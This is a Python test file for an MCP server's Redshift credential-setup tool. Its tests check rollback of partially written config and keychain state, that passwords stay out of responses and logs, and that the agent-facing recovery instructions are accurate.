        # Dialog runs first now — tripwire records that it did, and that the
        # write attempt happened downstream of it.
        dialog_calls = []
        monkeypatch.setattr(
            'redshift_comment_mcp.setup_cli._collect_password_via_dialog',
            lambda profile: dialog_calls.append(profile) or ("x", "ok"),
        )
        # Keychain tripwire: a failed field write must not leave a password
        # behind for a profile that has no fields.
        set_pw_calls = []
        monkeypatch.setattr(
            'redshift_comment_mcp.config.set_password',
            lambda name, pw: set_pw_calls.append((name, pw)),
        )

        tools = self._make_tools()
        setup_via_dialog = _get_tool_fn(tools, 'setup_via_dialog')

        result = setup_via_dialog(host='h', user='u', dbname='d')

        assert result["error"] == "write_profile_failed"
        assert result["exception_class"] == "PermissionError"
        # CWE-209: response MUST NOT carry raw exception text
        import json
        serialized = json.dumps(result)
        assert secret_marker not in serialized, (
            "write_profile_failed response leaked raw exception text — "
            "CWE-209 regression"
        )
        # ...but should still be agent-actionable
        assert "config" in result["message"].lower() or "filesystem" in result["message"].lower()
        # Ordering tripwire: the dialog ran first, exactly once.
        assert dialog_calls == ['default']
        # And the collected password was not stored for a fieldless profile.
        assert set_pw_calls == []

    def test_setup_via_dialog_keychain_write_failed_returns_error(self, monkeypatch):
        """set_password raises (e.g. keychain locked / access denied) AFTER
        write_profile succeeded → tool returns keychain_write_failed. The
        config.toml entry is left behind (recoverable: user can re-key via
        set-password --dialog later).

        Per CWE-209 (round-5): raw str(e) is NOT in the response message —
        only the exception class name + a sanitized hint."""
        password_marker = "the-actual-password-this-must-never-leak"
        monkeypatch.setattr(
            'redshift_comment_mcp.config.write_profile',
            lambda name, **kw: None,
        )
        def failing_set(name, pw):
            # Simulate a hypothetical buggy backend that includes the
            # password in its exception args. The sanitisation logic must
            # prevent this from reaching the MCP response regardless.
            raise RuntimeError(f"backend rejected password {password_marker!r}")
        monkeypatch.setattr('redshift_comment_mcp.config.set_password', failing_set)
        monkeypatch.setattr(
            'redshift_comment_mcp.setup_cli._collect_password_via_dialog',
            lambda profile: ("dialog-pw", "ok"),
        )

        tools = self._make_tools()
        setup_via_dialog = _get_tool_fn(tools, 'setup_via_dialog')

        result = setup_via_dialog(host='h', user='u', dbname='d')

        assert result["error"] == "keychain_write_failed"
        assert result["exception_class"] == "RuntimeError"
        # Hard security invariant: password must NEVER reach the response
        import json
        serialized = json.dumps(result)
        assert password_marker not in serialized, (
            "keychain_write_failed response leaked the password value "
            "via the exception args — CWE-209 + LLM02:2025 regression"
        )
        # ...but message remains actionable
        assert "--stdin" in result["message"]

    def test_setup_via_dialog_keychain_write_failed_keeps_password_out_of_log(
        self, monkeypatch, tmp_path, caplog
    ):
        """Same backend, the other exit: the server log.

        The sibling test above pins the RESPONSE clean while the log line
        beside it interpolated the very exception whose args carry the
        password. The intent's constraint names logs alongside responses, and
        a keychain backend's exception args are outside this repo's control —
        so only the exception CLASS may be logged from this branch.
        """
        import logging as _logging

        monkeypatch.setenv("XDG_CONFIG_HOME", str(tmp_path))
        caplog.set_level(_logging.DEBUG)

        password_marker = "the-actual-password-this-must-never-leak"
        monkeypatch.setattr(
            'redshift_comment_mcp.config.write_profile',
            lambda name, **kw: None,
        )

        def failing_set(name, pw):
            raise RuntimeError(f"backend rejected password {pw!r}")
        monkeypatch.setattr('redshift_comment_mcp.config.set_password', failing_set)
        monkeypatch.setattr(
            'redshift_comment_mcp.setup_cli._collect_password_via_dialog',
            lambda profile: (password_marker, "ok"),
        )

        tools = self._make_tools()
        setup_via_dialog = _get_tool_fn(tools, 'setup_via_dialog')

        result = setup_via_dialog(host='h', user='u', dbname='d')

        assert result["error"] == "keychain_write_failed"
        # Render each record the way a handler would, so an exc_info-rendered
        # traceback (whose last line is str(e)) counts as logged text.
        formatter = _logging.Formatter()
        logged = "\n".join(formatter.format(record) for record in caplog.records)
        assert password_marker not in logged, (
            "the password reached the server log via the keychain backend's "
            "exception args — the constraint covers logs, not just responses"
        )

    def test_setup_via_dialog_keychain_specific_exception_hints(self, monkeypatch):
        """Snyk guidance: catch specific keyring exception types where
        possible. setup_via_dialog maps known exception class names to
        tailored hint sentences so the agent sees a more useful diagnosis
        than the generic fallback ("Underlying keychain write failed.")."""
        monkeypatch.setattr(
            'redshift_comment_mcp.config.write_profile',
            lambda name, **kw: None,
        )
        monkeypatch.setattr(
            'redshift_comment_mcp.setup_cli._collect_password_via_dialog',
            lambda profile: ("pw", "ok"),
        )

        # Build a fake KeyringLocked exception class — what real keyring
        # would raise on a locked backend. setup_via_dialog inspects
        # type(e).__name__, so a class named KeyringLocked is enough.
        class KeyringLocked(Exception):
            pass

        def failing_set(name, pw):
            raise KeyringLocked()
        monkeypatch.setattr('redshift_comment_mcp.config.set_password', failing_set)

        tools = self._make_tools()
        setup_via_dialog = _get_tool_fn(tools, 'setup_via_dialog')
        result = setup_via_dialog(host='h', user='u', dbname='d')

        assert result["exception_class"] == "KeyringLocked"
        # Tailored hint, not the generic fallback
        assert "locked" in result["message"].lower()
        assert "unlock" in result["message"].lower()

    def test_setup_via_dialog_overwrites_existing_profile(self, monkeypatch):
        """Calling setup_via_dialog with an existing profile name should
        overwrite the fields (same UX as /redshift-setup skill). Second call
        wins — final state is the most recent invocation's args."""
        write_calls = []
        pw_calls = []
        monkeypatch.setattr(
            'redshift_comment_mcp.config.write_profile',
            lambda name, **kw: write_calls.append((name, kw)),
        )
        monkeypatch.setattr(
            'redshift_comment_mcp.config.set_password',
            lambda name, pw: pw_calls.append((name, pw)),
        )
        monkeypatch.setattr(
            'redshift_comment_mcp.setup_cli._collect_password_via_dialog',
            lambda profile: ("pw", "ok"),
        )
        monkeypatch.setattr(
            'redshift_comment_mcp.setup_cli._test_redshift_connection',
            lambda *args, **kw: (True, None),
        )

        tools = self._make_tools()
        setup_via_dialog = _get_tool_fn(tools, 'setup_via_dialog')

        r1 = setup_via_dialog(host='old-host', user='u1', dbname='d1', profile='default')
        r2 = setup_via_dialog(host='new-host', user='u2', dbname='d2', profile='default')

        assert r1["status"] == "configured" and r2["status"] == "configured"
        assert len(write_calls) == 2
        assert write_calls[0][1]['host'] == 'old-host'
        assert write_calls[1][1]['host'] == 'new-host'  # second call overwrites
        assert len(pw_calls) == 2

    def test_fastmcp_instructions_contains_setup_recovery_block(self):
        """The SETUP RECOVERY block in FastMCP `instructions=` is the agent's
        discovery channel for degraded-mode UX at handshake time. Regression
        net against accidental removal during instructions edit / refactor."""
        tools = self._make_tools()
        instructions = tools.mcp.instructions or ""
        assert "SETUP RECOVERY" in instructions, (
            "instructions= missing SETUP RECOVERY block — agents lose the "
            "handshake-time discovery channel for degraded-mode UX"
        )
        assert "setup_via_dialog" in instructions, (
            "instructions= must name setup_via_dialog so agents know which "
            "tool to call on not_configured error"
        )
        assert "not_configured" in instructions, (
            "instructions= must name the not_configured error code so the "
            "agent can pattern-match it"
        )

    def test_fastmcp_instructions_describe_the_dialog_first_write_order(self):
        """`instructions=` is read at handshake by every client agent, so it
        outranks the per-call response messages. It described the OLD order
        (fields written, then the dialog) and handed out a bare
        `set-password --stdin` recovery — which, with no fields written,
        stores a password for a profile that has none, and for an existing
        profile of that name re-keys its still-valid password with the new
        cluster's. That is the exact destruction this change's rollback
        exists to prevent, prescribed by the server's own handshake text.
        """
        tools = self._make_tools()
        instructions = tools.mcp.instructions or ""
        assert "SETUP RECOVERY" in instructions
        # The block is hard-wrapped prose, so every phrase below is matched
        # against a whitespace-flattened copy — otherwise a re-wrap that
        # leaves the meaning intact fails the test, and worse, a re-wrap that
        # changes the meaning passes it.
        recovery = " ".join(
            instructions.split("SETUP RECOVERY", 1)[1].split()
        )

        assert "It writes config.toml fields, launches" not in recovery, (
            "instructions still describe the pre-change write order"
        )
        assert "only once a password is in hand" in recovery, (
            "instructions must state that neither store is touched until the "
            "dialog has returned a password"
        )
        assert "NOTHING was written" in recovery, (
            "the password-step failure statuses must tell the agent that a "
            "pre-existing healthy profile is untouched"
        )
        assert recovery.count("set-password --profile") > 0
        assert recovery.count("set-password --profile") == recovery.count(
            "set-fields --profile"
        ), (
            "every `set-password --stdin` recovery hint in the SETUP RECOVERY "
            "block must be paired with `set-fields`: nothing was written, so "
            "set-password alone leaves a password with no fields, or re-keys "
            "an existing profile's password with the new cluster's"
        )
        # The count equality above counts `set-password --profile`, so
        # re-adding the exact stale hint this change removed — "OR fall back
        # to `set-password --stdin` from a terminal", which carries no
        # `--profile` — leaves both counters equal and the assertion green.
        # The unpaired form has to be named outright. This literal cannot
        # match the paired form, which reads `set-password --profile X
        # --stdin`.
        assert "set-password --stdin" not in recovery, (
            "an unpaired `set-password --stdin` hint is back in the SETUP "
            "RECOVERY block: with nothing written, it stores a password for "
            "a profile that has no fields, or re-keys an existing profile's "
            "still-valid password with the new cluster's"
        )
        assert "DO NOT pass the password as a tool argument" in recovery


def _refuse_keychain_write(_name, _pw):
    """Stand-in for `config.set_password` against a locked OS keychain.

    Shared by every rollback test below: they differ in what they assert
    about the stores afterwards, not in how the keychain fails.
    """
    raise RuntimeError("keychain is locked")


class TestSetupViaDialogPersistsNothingWithoutPassword:
    """Write-ordering safety: a password-step failure must leave BOTH stores
    byte-for-byte as they were.

    Pre-change, `write_profile` ran before the dialog opened, so any of the
    five password-step failures left config.toml pointing at the newly
    supplied host while the OS keychain still held the PREVIOUS profile's
    still-valid password. `get_setup_status` then reported
    ``configured: true`` for a credential pair that had never existed
    together — a silent half-written profile. These tests exercise the REAL
    `config.write_profile` / `config.set_password` against a tmp
    XDG_CONFIG_HOME and an in-memory keychain, so they assert persisted
    bytes rather than call counts.
    """

    # The five password-step failures, as (dialog return value, expected
    # response status). Four are reason-keyed; the fifth is keyed by the
    # password being empty despite an "ok" reason.
    FAILURE_CASES = [
        ((None, "cancelled"), "dialog_cancelled"),
        ((None, "permission_denied"), "permission_denied"),
        ((None, "unavailable"), "dialog_unavailable"),
        ((None, "unsupported"), "platform_unsupported"),
        (("", "ok"), "empty_password"),
    ]

    @pytest.fixture
    def populated_stores(self, tmp_path, monkeypatch):
        """A REAL config.toml under a tmp XDG root plus an in-memory keychain,
        both pre-populated with a complete, working profile named 'prod'.

        Yields ``(config_path, keychain_storage)`` so a test can snapshot the
        exact bytes / entries before the call and compare after.
        """
        monkeypatch.setenv("XDG_CONFIG_HOME", str(tmp_path))

        storage: dict = {}
        import keyring as _kr
        monkeypatch.setattr(
            _kr, "set_password",
            lambda service, user, password: storage.__setitem__((service, user), password),
        )
        monkeypatch.setattr(
            _kr, "get_password",
            lambda service, user: storage.get((service, user)),
        )

        from redshift_comment_mcp import config as cfg
        cfg.write_profile(
            "prod", host="old.example.com", port=5439,
            user="olduser", dbname="olddb",
        )
        cfg.set_password("prod", "the-still-valid-old-password")
        yield cfg.config_path(), storage

    def _make_tools(self):
        from redshift_comment_mcp.config import ConfigurationError

        def provider():
            raise ConfigurationError("not yet")
        return RedshiftTools(provider)

    @pytest.mark.parametrize(
        "dialog_return,expected_status",
        FAILURE_CASES,
        ids=[status for _, status in FAILURE_CASES],
    )
    def test_password_step_failure_leaves_config_toml_byte_identical(
        self, monkeypatch, populated_stores, dialog_return, expected_status
    ):
        """A1: after a failed password step, config.toml is byte-identical.

        The caller-supplied host differs from the stored one, so any write
        at all shows up as a byte difference.
        """
        config_path, _storage = populated_stores
        before = config_path.read_bytes()

        monkeypatch.setattr(
            'redshift_comment_mcp.setup_cli._collect_password_via_dialog',
            lambda profile: dialog_return,
        )

        tools = self._make_tools()
        setup_via_dialog = _get_tool_fn(tools, 'setup_via_dialog')

        result = setup_via_dialog(
            host='new.example.com', user='newuser',
            dbname='newdb', profile='prod', port=5440,
        )

        assert result["status"] == expected_status, f"got: {result}"
        assert config_path.read_bytes() == before, (
            f"{expected_status}: config.toml was modified even though no "
            f"password was ever collected — half-written profile regression"
        )

    @pytest.mark.parametrize(
        "dialog_return,expected_status",
        FAILURE_CASES,
        ids=[status for _, status in FAILURE_CASES],
    )
    def test_password_step_failure_leaves_keychain_entry_unchanged(
        self, monkeypatch, populated_stores, dialog_return, expected_status
    ):
        """A2: after a failed password step, the keychain entry is unchanged.

        Pairs with the config.toml assertion above: the danger is precisely
        the SKEW between the two stores, so both directions need pinning.
        """
        _config_path, storage = populated_stores
        before = dict(storage)

        monkeypatch.setattr(
            'redshift_comment_mcp.setup_cli._collect_password_via_dialog',
            lambda profile: dialog_return,
        )

        tools = self._make_tools()
        setup_via_dialog = _get_tool_fn(tools, 'setup_via_dialog')

        result = setup_via_dialog(
            host='new.example.com', user='newuser',
            dbname='newdb', profile='prod', port=5440,
        )

        assert result["status"] == expected_status, f"got: {result}"
        assert storage == before, (
            f"{expected_status}: keychain entry changed even though no "
            f"password was collected"
        )

    def test_successful_call_writes_both_stores(self, monkeypatch, populated_stores):
        """Negative direction: the guard must not block the happy path.

        A test that only asserts "nothing was written" would pass against a
        tool that never writes anything, so pin the write as well.
        """
        config_path, storage = populated_stores

        monkeypatch.setattr(
            'redshift_comment_mcp.setup_cli._collect_password_via_dialog',
            lambda profile: ("brand-new-password", "ok"),
        )
        monkeypatch.setattr(
            'redshift_comment_mcp.setup_cli._test_redshift_connection',
            lambda *args, **kw: (True, None),
        )

        tools = self._make_tools()
        setup_via_dialog = _get_tool_fn(tools, 'setup_via_dialog')

        result = setup_via_dialog(
            host='new.example.com', user='newuser',
            dbname='newdb', profile='prod', port=5440,
        )

        assert result["status"] == "configured", f"got: {result}"

        from redshift_comment_mcp import config as cfg
        written = cfg.read_profile("prod")
        assert written == {
            "host": "new.example.com", "port": 5440,
            "user": "newuser", "dbname": "newdb",
        }, f"config.toml not updated on the success path: {written}"
        assert cfg.get_password("prod") == "brand-new-password", (
            "keychain not updated on the success path"
        )
        # Sanity: the file really is the one we snapshotted.
        assert config_path.exists()
        assert len(storage) == 1

    def test_missing_field_still_rejected_before_the_dialog(
        self, monkeypatch, populated_stores
    ):
        """Field validation keeps its place at the very front of the flow:
        it must still short-circuit BEFORE the dialog opens, so an agent that
        forgot a field never makes the user type a password for nothing."""
        config_path, storage = populated_stores
        before_bytes = config_path.read_bytes()
        before_storage = dict(storage)

        dialog_calls = []
        monkeypatch.setattr(
            'redshift_comment_mcp.setup_cli._collect_password_via_dialog',
            lambda profile: dialog_calls.append(profile) or ("pw", "ok"),
        )

        tools = self._make_tools()
        setup_via_dialog = _get_tool_fn(tools, 'setup_via_dialog')

        result = setup_via_dialog(host='', user='u', dbname='d', profile='prod')

        assert result["error"] == "missing_field"
        assert dialog_calls == [], (
            "missing_field must be rejected before the password dialog opens"
        )
        assert config_path.read_bytes() == before_bytes
        assert storage == before_storage

    def test_keychain_write_failure_restores_config_toml_byte_identical(
        self, monkeypatch, populated_stores
    ):
        """The same half-write, one step later: `write_profile` lands, then
        `set_password` raises — a locked macOS keychain is an ordinary state.

        Without a rollback config.toml points at the NEW host while the
        keychain still holds the PREVIOUS profile's still-valid password, and
        `get_setup_status` reports ``configured: true`` for a credential pair
        that never existed together. A failed `set_password` means no password
        was stored, so the intent's outcome covers it.
        """
        config_path, storage = populated_stores
        before_bytes = config_path.read_bytes()
        before_storage = dict(storage)

        monkeypatch.setattr(
            'redshift_comment_mcp.setup_cli._collect_password_via_dialog',
            lambda profile: ("a-brand-new-password", "ok"),
        )

        monkeypatch.setattr(
            'redshift_comment_mcp.config.set_password', _refuse_keychain_write
        )

        tools = self._make_tools()
        setup_via_dialog = _get_tool_fn(tools, 'setup_via_dialog')

        result = setup_via_dialog(
            host='new.example.com', user='newuser',
            dbname='newdb', profile='prod', port=5440,
        )

        assert result["error"] == "keychain_write_failed", f"got: {result}"
        assert config_path.read_bytes() == before_bytes, (
            "config.toml was left pointing at the new host while the keychain "
            "still holds the old password — the half-written profile survives "
            "a keychain failure"
        )
        assert storage == before_storage
        from redshift_comment_mcp import config as cfg
        assert cfg.read_profile("prod")["host"] == "old.example.com"

    def test_keychain_write_failure_removes_a_config_toml_it_created(
        self, monkeypatch, tmp_path
    ):
        """The absence branch of the same rollback.

        When there was no config.toml at all before the call, "exactly as it
        was" means the file is gone again — not left holding a profile whose
        password never made it to the keychain.
        """
        monkeypatch.setenv("XDG_CONFIG_HOME", str(tmp_path))

        storage: dict = {}
        import keyring as _kr
        monkeypatch.setattr(
            _kr, "set_password",
            lambda service, user, password: storage.__setitem__((service, user), password),
        )
        monkeypatch.setattr(
            _kr, "get_password",
            lambda service, user: storage.get((service, user)),
        )

        from redshift_comment_mcp import config as cfg
        config_path = cfg.config_path()
        assert not config_path.exists(), "fixture precondition: no config yet"

        monkeypatch.setattr(
            'redshift_comment_mcp.setup_cli._collect_password_via_dialog',
            lambda profile: ("a-brand-new-password", "ok"),
        )

        monkeypatch.setattr(
            'redshift_comment_mcp.config.set_password', _refuse_keychain_write
        )

        tools = self._make_tools()
        setup_via_dialog = _get_tool_fn(tools, 'setup_via_dialog')

        result = setup_via_dialog(
            host='new.example.com', user='newuser',
            dbname='newdb', profile='fresh', port=5440,
        )

        assert result["error"] == "keychain_write_failed", f"got: {result}"
        assert not config_path.exists(), (
            "a config.toml created by the rolled-back write was left behind"
        )
        assert storage == {}

    def test_keychain_write_failure_restores_the_users_file_mode(
        self, monkeypatch, populated_stores
    ):
        """Finding G: the rollback restored bytes but not the permission bits.

        `config.write_profile` chmods config.toml to 0600 unconditionally, so a
        file the user had deliberately left at 0640 came back 0600 from a
        rolled-back call — while the response's message claims the profile was
        "rolled back to exactly what was saved before this call, so both stores
        are untouched". Narrowing, not widening, so it costs the user a setting
        rather than exposing anything; the response's claim is still not true.
        """
        config_path, _storage = populated_stores
        config_path.chmod(0o640)
        before_mode = config_path.stat().st_mode

        monkeypatch.setattr(
            'redshift_comment_mcp.setup_cli._collect_password_via_dialog',
            lambda profile: ("a-brand-new-password", "ok"),
        )

        monkeypatch.setattr(
            'redshift_comment_mcp.config.set_password', _refuse_keychain_write
        )

        tools = self._make_tools()
        setup_via_dialog = _get_tool_fn(tools, 'setup_via_dialog')

        result = setup_via_dialog(
            host='new.example.com', user='newuser',
            dbname='newdb', profile='prod', port=5440,
        )

        assert result["error"] == "keychain_write_failed", f"got: {result}"
        assert config_path.stat().st_mode == before_mode, (
            f"the rollback changed config.toml's mode from "
            f"{oct(before_mode)} to {oct(config_path.stat().st_mode)} while "
            f"reporting both stores untouched"
        )

    def test_write_profile_failure_mid_write_rolls_config_toml_back(
        self, monkeypatch, populated_stores
    ):
        """A `write_profile` that fails PART WAY through is the one failure
        that damages config.toml rather than leaving it alone.

        `config.write_profile` opens config.toml `"wb"` — which truncates it —
        and only then serialises. A failure between those two steps (full
        disk, I/O error) leaves the file holding a fragment: the target
        profile is destroyed AND so is every unrelated profile in the same
        file, while the keychain still holds the old password. The tool
        already snapshots the bytes before the write; it just never used the
        snapshot on this branch, so the shape it returned ("the fields did not
        reach config.toml") was a claim it had not checked.
        """
        config_path, storage = populated_stores
        from redshift_comment_mcp import config as cfg
        cfg.write_profile(
            "unrelated", host="other.example.com", port=5439,
            user="otheruser", dbname="otherdb",
        )
        before_bytes = config_path.read_bytes()
        before_storage = dict(storage)

        monkeypatch.setattr(
            'redshift_comment_mcp.setup_cli._collect_password_via_dialog',
            lambda profile: ("a-brand-new-password", "ok"),
        )

        import tomli_w

        def truncating_dump(_obj, fp):
            """The open() truncated the file; the serialise dies half way."""
            fp.write(b"[profile.pr")
            raise OSError(28, "No space left on device")
        monkeypatch.setattr(tomli_w, "dump", truncating_dump)

        tools = self._make_tools()
        setup_via_dialog = _get_tool_fn(tools, 'setup_via_dialog')

        result = setup_via_dialog(
            host='new.example.com', user='newuser',
            dbname='newdb', profile='prod', port=5440,
        )

        assert result["error"] == "write_profile_failed", f"got: {result}"
        assert config_path.read_bytes() == before_bytes, (
            "config.toml was left truncated by a half-finished write — the "
            "snapshot taken two lines earlier was never used"
        )
        assert cfg.read_profile("prod")["host"] == "old.example.com"
        assert cfg.read_profile("unrelated")["host"] == "other.example.com", (
            "an unrelated profile sharing config.toml was destroyed"
        )
        assert storage == before_storage
        assert "a-brand-new-password" not in str(result)

    def test_a_snapshot_that_was_never_taken_does_not_delete_config_toml(
        self, monkeypatch, populated_stores
    ):
        """The rollback's guard: `None` means "there was no config.toml", and
        restoring that meaning UNLINKS the file.

        So the branch cannot key off `config_snapshot is None` — on the path
        where `_snapshot_config_bytes` itself raised, that name is still at
        its pre-bound `None` while a perfectly good config.toml sits on disk.
        A restore there deletes the user's profiles outright: strictly worse
        than the truncation the rollback was added to undo.
        """
        from pathlib import Path as _Path

        config_path, storage = populated_stores
        real_read_bytes = _Path.read_bytes
        before_bytes = real_read_bytes(config_path)
        before_storage = dict(storage)

        monkeypatch.setattr(
            'redshift_comment_mcp.setup_cli._collect_password_via_dialog',
            lambda profile: ("a-brand-new-password", "ok"),
        )

        # Fails the snapshot read ONCE. A restore attempt would then re-read
        # successfully, see bytes where the un-taken snapshot says None, and
        # unlink the file.
        failed_once = []

        def fail_first_read(self):
            if str(self) == str(config_path) and not failed_once:
                failed_once.append(True)
                raise OSError(5, "Input/output error", str(config_path))
            return real_read_bytes(self)
        monkeypatch.setattr(_Path, "read_bytes", fail_first_read)

        tools = self._make_tools()
        setup_via_dialog = _get_tool_fn(tools, 'setup_via_dialog')

        result = setup_via_dialog(
            host='new.example.com', user='newuser',
            dbname='newdb', profile='prod', port=5440,
        )

        assert result["error"] == "write_profile_failed", f"got: {result}"
        assert config_path.exists(), (
            "the rollback deleted a config.toml it had never snapshotted"
        )
        assert real_read_bytes(config_path) == before_bytes
        assert storage == before_storage

    def test_write_profile_failure_says_so_when_the_rollback_also_fails(
        self, monkeypatch, populated_stores
    ):
        """The mirror of the test above: a failed write whose rollback ALSO
        fails must not report the state the successful rollback reports.

        `write_profile_failed`'s message used to assert one state
        unconditionally; both branches of the new one are claims about the
        file on disk, so both have to be exercised or one of them is prose
        nobody ran.

        `config.write_profile` is atomic now, so a failed write can no longer
        be the thing that leaves config.toml unreadable — this test used to
        reach the branch that way. The rollback is driven into its failure
        branch the one way still reachable: the read it does to decide whether
        a restore is needed at all raises.
        """
        from pathlib import Path as _Path

        config_path, _storage = populated_stores
        real_read_bytes = _Path.read_bytes
        before_bytes = real_read_bytes(config_path)

        monkeypatch.setattr(
            'redshift_comment_mcp.setup_cli._collect_password_via_dialog',
            lambda profile: ("a-brand-new-password", "ok"),
        )

        import tomli_w

        def failing_dump(_obj, _fp):
            raise OSError(28, "No space left on device")
        monkeypatch.setattr(tomli_w, "dump", failing_dump)

        # Read 1 is the pre-call snapshot and must succeed, or the rollback
        # is skipped entirely. Read 2 is the rollback's own "does this even
        # need restoring?" check — failing it drives `_restore_config_bytes`
        # into its `except OSError` branch.
        reads = []

        def fail_second_read(self):
            if str(self) == str(config_path):
                reads.append(True)
                if len(reads) > 1:
                    raise OSError(5, "Input/output error", str(config_path))
            return real_read_bytes(self)
        monkeypatch.setattr(_Path, "read_bytes", fail_second_read)

        tools = self._make_tools()
        setup_via_dialog = _get_tool_fn(tools, 'setup_via_dialog')

        result = setup_via_dialog(
            host='new.example.com', user='newuser',
            dbname='newdb', profile='prod', port=5440,
        )

        assert result["error"] == "write_profile_failed", f"got: {result}"
        assert "could NOT be rolled back" in result["message"], (
            f"the restore failed but the response still claims config.toml is "
            f"back to its pre-call bytes: {result['message']}"
        )
        assert real_read_bytes(config_path) == before_bytes, (
            "the atomic write left config.toml exactly as it was, even though "
            "the rollback could not confirm it"
        )
        assert "a-brand-new-password" not in str(result)

    def test_keychain_failure_hint_names_set_fields_when_config_was_restored(
        self, monkeypatch, populated_stores
    ):
        """The restored branch has just told the agent both stores are
        untouched, so the fields are gone or reverted. A bare
        `set-password --stdin` there stores a password for a profile with no
        fields — or, for a profile that already existed, overwrites its
        still-valid password with the new cluster's, destroying exactly the
        setup the rollback just protected. The hint has to name `set-fields`
        too.
        """
        _config_path, _storage = populated_stores

        monkeypatch.setattr(
            'redshift_comment_mcp.setup_cli._collect_password_via_dialog',
            lambda profile: ("a-brand-new-password", "ok"),
        )
        monkeypatch.setattr(
            'redshift_comment_mcp.config.set_password', _refuse_keychain_write
        )

        tools = self._make_tools()
        setup_via_dialog = _get_tool_fn(tools, 'setup_via_dialog')

        result = setup_via_dialog(
            host='new.example.com', user='newuser',
            dbname='newdb', profile='prod', port=5440,
        )

        assert result["error"] == "keychain_write_failed", f"got: {result}"
        msg = result["message"]
        assert "untouched" in msg, "expected the restored branch's wording"
        assert "set-fields" in msg, (
            "the restored branch tells the user both stores are untouched, "
            "then hands them a recovery that only writes the password"
        )
        assert "set-password" in msg

    def test_keychain_failure_hint_omits_set_fields_when_config_survived(
        self, monkeypatch, populated_stores
    ):
        """The mirror branch: when the restore itself failed, the new fields
        ARE in config.toml, so `set-password --stdin` alone is the correct
        (and minimal) repair — re-running `set-fields` would only re-write
        what is already there.
        """
        from pathlib import Path as _Path

        _config_path, _storage = populated_stores

        monkeypatch.setattr(
            'redshift_comment_mcp.setup_cli._collect_password_via_dialog',
            lambda profile: ("a-brand-new-password", "ok"),
        )
        monkeypatch.setattr(
            'redshift_comment_mcp.config.set_password', _refuse_keychain_write
        )

        def unwritable(self, _data):
            raise PermissionError(13, "Permission denied", str(self))
        monkeypatch.setattr(_Path, "write_bytes", unwritable)

        tools = self._make_tools()
        setup_via_dialog = _get_tool_fn(tools, 'setup_via_dialog')

        result = setup_via_dialog(
            host='new.example.com', user='newuser',
            dbname='newdb', profile='prod', port=5440,
        )

        assert result["error"] == "keychain_write_failed", f"got: {result}"
        msg = result["message"]
        assert "could NOT be rolled back" in msg, (
            f"expected the restore-failed branch, got: {msg}"
        )
        assert "set-password" in msg
        assert "set-fields" not in msg, (
            "the fields did reach config.toml on this branch — sending the "
            "user back through set-fields contradicts the same message's own "
            "description of the state"
        )

    def test_unreadable_config_toml_returns_a_shape_and_writes_nothing(
        self, monkeypatch, populated_stores
    ):
        """Finding H: an unreadable config.toml escaped the tool entirely.

        `_snapshot_config_bytes` catches only FileNotFoundError, and its call
        site sat outside every `try`. A config.toml that exists but cannot be
        read — mode 000, a root-owned file from a sudo install, a directory
        where the file should be — raised straight out of `setup_via_dialog`:
        the client got a raw exception instead of a documented shape, and the
        escaping frame held the live `password` local, which is the same
        frame-locals exposure the branches below drop `exc_info=True` to avoid.

        The second half matters as much as the first: when the snapshot cannot
        be taken the tool must not go on to write a state it cannot undo.
        """
        from pathlib import Path as _Path

        config_path, storage = populated_stores
        real_read_bytes = _Path.read_bytes
        before_bytes = real_read_bytes(config_path)
        before_storage = dict(storage)

        monkeypatch.setattr(
            'redshift_comment_mcp.setup_cli._collect_password_via_dialog',
            lambda profile: ("a-brand-new-password", "ok"),
        )

        def unreadable(self):
            if str(self) == str(config_path):
                raise PermissionError(13, "Permission denied", str(config_path))
            return real_read_bytes(self)
        monkeypatch.setattr(_Path, "read_bytes", unreadable)

        tools = self._make_tools()
        setup_via_dialog = _get_tool_fn(tools, 'setup_via_dialog')

        try:
            result = setup_via_dialog(
                host='new.example.com', user='newuser',
                dbname='newdb', profile='prod', port=5440,
            )
        except Exception as exc:  # noqa: BLE001 — the defect is that this fires
            pytest.fail(
                f"setup_via_dialog raised {type(exc).__name__} instead of "
                f"returning a documented response shape; the password the "
                f"user just typed is a live local of the escaping frame"
            )

        assert {"status", "error"} & set(result), (
            f"response carries neither discriminator key: {result}"
        )
        assert "a-brand-new-password" not in str(result), (
            "the password reached the response"
        )
        assert real_read_bytes(config_path) == before_bytes, (
            "the tool wrote profile fields it had no snapshot to undo"
        )
        assert storage == before_storage


class TestDegradedModeContractAdditional:
    """Round-2 coverage: end-to-end bootstrap-then-use, lazy-property direct
    verification, and guard scope (only ConfigurationError gets converted —
    other exceptions propagate normally)."""

    def test_bootstrap_then_use_end_to_end(self, monkeypatch, mock_config):
        """The v0.7.0 promise visualised: server boots without profile, agent
        sets it up via the MCP tool, next DB tool call works WITHOUT a
        restart. Glues all three changes together (degraded-mode start, lazy
        re-resolution, setup_via_dialog write) and proves they compose."""
        from redshift_comment_mcp.config import ConfigurationError

        config, mock_conn = mock_config
        # Shared state simulating "is the profile configured yet" — flipped
        # by the mocked set_password (last step of setup_via_dialog).
        state = {"configured": False}

        def lazy_provider():
            if state["configured"]:
                return config
            raise ConfigurationError("Profile 'default' is not configured")

        monkeypatch.setattr(
            'redshift_comment_mcp.config.write_profile',
            lambda name, **kw: None,
        )
        monkeypatch.setattr(
            'redshift_comment_mcp.config.set_password',
            lambda name, pw: state.__setitem__("configured", True),
        )
        monkeypatch.setattr(
            'redshift_comment_mcp.setup_cli._collect_password_via_dialog',
            lambda profile: ("dialog-pw", "ok"),
        )
        # End-to-end test stubs the connection check too — covered by
        # dedicated TestSetupViaDialogConnectionVerification tests below.
        monkeypatch.setattr(
            'redshift_comment_mcp.setup_cli._test_redshift_connection',
            lambda *args, **kw: (True, None),
        )

        tools = RedshiftTools(lazy_provider)
        list_schemas = _get_tool_fn(tools, 'list_schemas')
        setup_via_dialog = _get_tool_fn(tools, 'setup_via_dialog')

        # 1. Initial call: not configured — server didn't crash, tool returned error
        first = list_schemas()
        assert first.get("error") == "not_configured", (
            f"Step 1: expected not_configured error, got {first}"
        )

        # 2. Agent calls setup_via_dialog with conversational fields
        setup = setup_via_dialog(host='h.example.com', user='u', dbname='d')
        assert setup["status"] == "configured", f"Step 2: setup failed: {setup}"

        # 3. Same tool call now works — NO restart, lazy resolve picked up state
        with patch('awswrangler.redshift.read_sql_query') as mock_read:
            mock_read.return_value = pd.DataFrame({
                'schema_name': ['public'],
                'schema_comment': ['ok'],
            })
            success = list_schemas()
        assert success.get("error") != "not_configured", (
            f"Step 3: lazy resolve should have picked up new profile, got {success}"
        )
        assert "schemas" in success or "items" in success, (
            f"Step 3: expected schemas in response, got keys: {list(success.keys())}"
        )

